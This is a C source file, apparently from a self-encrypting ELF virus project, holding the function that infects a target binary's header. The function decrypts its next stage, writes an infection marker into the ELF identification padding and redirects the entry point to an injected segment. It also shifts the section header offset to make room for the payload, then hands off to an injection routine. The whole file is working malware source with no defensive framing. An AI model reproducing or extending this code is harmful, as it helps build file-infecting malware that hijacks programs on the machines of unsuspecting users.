#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
	decrypt_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
	
	printf("%s\t%s\n", __PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
	if (context == FAILURE)
		goto label;

	*(unsigned int *)&host->header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;

	host->old_entry = host->header->e_entry;
	host->header->e_entry = host->note->self->p_vaddr;
	host->new_entry = host->header->e_entry;

	host->header->e_shoff += PAYLOAD_SIZE + (host->note->self->p_offset - (host->note->data->p_offset + host->note->data->p_filesz));

label:
	update_keychain_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
	decrypt_left(keychain, (char *)injection, (void *)autodestruction - (void *)injection);

	injection(host, keychain, context);
}
